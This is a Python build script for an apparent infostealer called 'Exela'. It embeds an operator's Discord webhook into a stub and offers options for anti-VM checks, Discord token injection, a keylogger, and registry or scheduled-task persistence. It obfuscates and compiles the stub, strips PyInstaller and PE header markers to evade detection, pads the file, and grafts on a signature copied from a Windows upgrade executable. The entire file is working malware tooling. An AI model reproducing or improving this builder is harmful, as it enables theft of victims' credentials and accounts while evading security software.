import os, shutil, sys, time, ctypes
from pkg_resources import parse_version


try:
    ctypes.windll.kernel32.SetConsoleTitleW(f"Exela | Builder | {os.getenv('computername')}")
except:pass


class SubModules:
    @staticmethod
    def ChangeExeHeaders(file_path:str) -> None:
        try:
            if os.path.exists(file_path):
                os.system("cls")
                print("Removing EXE Metada")
                time.sleep(1)
                SubModules().RemoveMetaData(file_path)
            else:print("err")
        except Exception as e:
            print(f"Error for exe headers : {str(e)}")
    @staticmethod
    def RemoveMetaData(file_path:str) -> None:
        try:
            ctypes.windll.kernel32.SetConsoleTitleW(f"Exela | Builder | Removigin Metadata") 
        except:pass
        with open(file_path, "rb") as file:
            data = file.read()
        data = data.replace(b"PyInstaller:", b"PyInstallem:")
        data = data.replace(b"pyi-runtime-tmpdir", b"bye-runtime-tmpdir")
        data = data.replace(b"pyi-windows-manifest-filename", b"bye-windows-manifest-filename")
        start_index = data.find(b"$") + 1
        end_index = data.find(b"PE\x00\x00", start_index) - 1
        data = data[:start_index] + bytes([0] * (end_index - start_index))  + data[end_index:]
        start_index = data.find(b"PE\x00\x00") + 8
        end_index = start_index + 4
        data = data[:start_index] + bytes([0] * (end_index - start_index))  + data[end_index:]
        with open(file_path, "wb") as file:
            file.write(data)
            del data # remove variable from memory
    @staticmethod
    def PumpFile(filePath:str, pump_size:int) -> None: # adding empty byte to file
        try:
            try:
                ctypes.windll.kernel32.SetConsoleTitleW(f"Exela | Builder | Pumping Stub") 
            except:pass
            if os.path.exists(filePath):
                additional_size_bytes = pump_size * 1024 * 1024

                with open(filePath, 'ab') as file:
                    current_size = file.tell()
                    target_size = current_size + additional_size_bytes

                    empty_bytes = bytearray([0x00] * additional_size_bytes)
                    file.write(empty_bytes)

                    print(f"{pump_size} MB added to {filePath}")
        except Exception as e:
            print(f"Error for pumping : {str(e)}")
    @staticmethod
    def ObfuscateFile(input_file:str) -> None: # obfuscating the source code
        os.system("cls")
        obf_file_path = os.path.join(os.getcwd(), "Obfuscator", "obf.py")
        run_code = f'python "{obf_file_path}" --junk "{input_file}"'
        os.system(run_code)
        time.sleep(1)
    @staticmethod
    def AddDigitalSignature(signed_file:str, input_file:str, output_file:str) -> None:
        run_code = f'python digital-sign.py -i "{signed_file}" -t "{input_file}" -o "{output_file}"'
        os.system(run_code)
    @staticmethod
    def ClearFiles() -> None:
        try:
            shutil.rmtree("build")
            shutil.rmtree("dist")
            os.remove("stub.py")
            os.remove("stub.spec")
        except:pass

class Builder:
    def __init__(self) -> None:
        self.VersionFile = os.path.join(os.getcwd() ,"AssemblySettings", "version.txt") # version file path
        self.PyInstallerCommand = f'pyinstaller --onefile --noconsole --clean --upx-dir upx-4.0.2-win64 --version-file "{self.VersionFile}" '
        self.Webhook = None
        self.IconPath = "NONE"
        self.PumpSize = int() # mb value
        self.UsePumper = bool()
        self.UseDiscordInejction = bool()
        self.UseKeylogger = bool()
        self.UseFakerError = bool()
        self.UseAntiVM = bool()
        self.StartpMethod = "no-startup" # default disabled
    def InstallModules(self) -> None:
        try:
            ctypes.windll.kernel32.SetConsoleTitleW(f"Exela | Builder | Installing Modules") 
        except:pass
        try:
            os.system('cls')
            os.system('pip install pynput')
            os.system("pip install cryptography")
            os.system("pip install psutil")
            os.system("pip install wmi")
            os.system("pip install dhooks")
            os.system("pip install requests")
            os.system("pip install pyinstaller")
            os.system("cls")
        except:pass
    def GetUserReqs(self) -> None:
        try:
            ctypes.windll.kernel32.SetConsoleTitleW(f"Exela | Builder | Getting Variables") 
        except:pass
        self.GetPump()
        self.GetIcon()
        antivm = str(input("Do u want to enabled Anti-VM : "))
        if antivm.lower() == "y" or antivm.lower() == "yes":
            self.UseAntiVM = True
        self.GetInjection()
        self.GetKeylogger()
        self.GetStartupMethod()
        self.GetFakeError()
        time.sleep(0.5)
    def MakeExe(self) -> None:
        
        self.WriteSettings()
        SubModules().ObfuscateFile("stub.py")
        try:
            ctypes.windll.kernel32.SetConsoleTitleW(f"Exela | Builder | Building ...") 
        except:pass
        pyinstaller_code = f'{self.PyInstallerCommand} --icon={self.IconPath} stub.py'
        os.system(pyinstaller_code)
        SubModules().ChangeExeHeaders(os.path.join("dist", "stub.exe")) 
        if self.UsePumper:
            SubModules().PumpFile(os.path.join("dist", "stub.exe"), self.PumpSize)
        SubModules().AddDigitalSignature(os.path.join("Signed", "Windows10Upgrade9252.exe"), os.path.join("dist", "stub.exe"), "Exela.exe")
        SubModules().ClearFiles()

    def WriteSettings(self) -> None:
        self.GetUserWebhook()
        self.GetUserReqs()
        with open("Exela.py", "r",encoding="utf-8", errors="ignore") as file:
            data = file.read()
        
        replaced_data = data.replace("%WEBHOOK_URL%", str(self.Webhook)).replace("'%AnTiVm%'", str(self.UseAntiVM)).replace("'%StartupMethod%'", str(self.StartpMethod)).replace("'%Keylogger%'", str(self.UseKeylogger)).replace("'%Injection%'", str(self.UseDiscordInejction)).replace('"%fake_error%"', str(self.UseFakerError))                                                                

        with open("stub.py", "w", encoding="utf-8", errors="ignore") as file:
            file.write(replaced_data)
    def GetPump(self) -> None:
        get_req = str(input("Do u want pump the file : "))
        if get_req.lower() == "y" or get_req.lower() == "yes":
            try:
                get_size = int(input("How much mb u want to add : "))
            except: get_size = 1 # if the user troll the question add 1 mb
            self.UsePumper = True
            self.PumpSize = get_size
    def GetUserWebhook(self) -> None:
        hook = str(input("Enter Your Discord Webhook URL : "))
        if hook == "":
            print("Write Your webhook URL!!!")
            os._exit(0)
        elif not hook.startswith("https://discord.com/api/webhooks/"):
            print(hook)
            print("Write a Correct Webhook URL")
            os._exit(0)
        else:self.Webhook = hook.replace("discordapp", "discord")
    def GetIcon(self) -> None:
        try:
            use_icon = str(input("Do u want to change the icon of the output file : "))
            if use_icon.lower() == "y" or use_icon.lower() == "yes":
                get_icon_path = str(input("icon file must be .ico otherwise the icon will not change\nEnter or Drag and Drop your icon here : "))
                if get_icon_path:
                    if not os.path.isfile(get_icon_path.replace('"', "")):
                        print("The file does not exist, icon change has been disabled")
                        self.IconPath = "NONE"
                    else:
                        if not self.CheckIcoFile(get_icon_path.replace('"', "")):
                            print("The file is not a correct icon file, icon change has been disabled")    
                            self.IconPath = "NONE"
                        else:
                            self.IconPath = get_icon_path
                else:
                    print("Icon cannot null or empty, now icon change has been disabled")
                    self.IconPath = "NONE"
        except:self.IconPath = "NONE"
    def CheckIcoFile(self, file_path:str) -> bool:
        try:
            ico_header = b'\x00\x00\x01\x00' # ico header
        
            with open(file_path, 'rb') as file:
                header_data = file.read(4)
                
            return header_data == ico_header
        except:
            return False
    def GetInjection(self) -> None:
        injection = str(input("Do u want to enabled Discord injection : "))
        if injection.lower() == "y" or injection.lower() == "yes":
            self.UseDiscordInejction = True
    def GetKeylogger(self) -> None:
        keylogger = str(input("Do u want to inject a keylogger after stealing process : "))
        if keylogger.lower() == "y" or keylogger.lower() == "yes":
            self.UseKeylogger = True
    def GetStartupMethod(self) -> None:
        startupReq = str(input("Do u want to use Startup : "))
        if startupReq.lower() == "y" or startupReq.lower() == "yes":
            print("--------------------------------------------\n1-) HKCLM/HKLM Startup (This method copies the file to startup using the registry)\n2-)Schtask Startup (This method uses the task scheduler to save the file to the task scheduler and automatically restarts it when any user logs in and restart every 1 hour\n--------------------------------------------\n\n")
            getMethod = str(input("1/2 Enter your selection: "))
            if getMethod == "1":
                self.StartpMethod = "regedit"
            elif getMethod == "2":
                self.StartpMethod = "schtasks"
            else:
                print("Invalid choice, now startup has been disabled")
                self.StartpMethod = "no-startup"
    def GetFakeError(self) -> None:
        fakeError = str(input("Do u want to use Fake Error : "))
        if fakeError.lower() == "y" or fakeError.lower() == "yes":
            self.UseFakerError = True

if __name__ == '__main__':
    
    if os.name == "nt":
        version = '.'.join([str(x) for x in (sys.version_info.major, sys.version_info.minor, sys.version_info.micro)])
        if (parse_version(version) < parse_version("3.10.0")):
            ctypes.windll.user32.MessageBoxW(0, f"{str(version)} un supported by Exela, pls upgrade 3.10.0 or 3.11.0", "Error",  0x10)
        elif (parse_version(version) > parse_version("3.11.0")):
            ctypes.windll.user32.MessageBoxW(0, f"{str(version)} un supported by Exela, pls downgrade 3.10.0 or 3.11.0", "Error",  0x10)
        elif (parse_version(version) == parse_version("3.10.0")) or parse_version(version) == parse_version("3.11.0"):
            try:
                Builder().InstallModules()
                Builder().MakeExe()
            except Exception as error:
                ctypes.windll.kernel32.SetConsoleTitleW(f"Exela | Builder | File cannot Compiled!") 
                ctypes.windll.user32.MessageBoxW(0, f"An error occurred while Building your file\n\nError : {str(error)}", "Error",  0x10)
                
            else:
                ctypes.windll.kernel32.SetConsoleTitleW(f"Exela | Builder | File Compiled!")
                ctypes.windll.user32.MessageBoxW(0, "Your File compiled succesfully, now u can close the window", "Information",  0x40)
                while True:
                    continue
                
        else:
            ctypes.windll.user32.MessageBoxW(0, f"{str(version)} un supported by Exela, pls use 3.10.0 or 3.11.0", "Error",  0x10)
    else:
        print("Just windows os supported by Exela")
        os._exit(0)
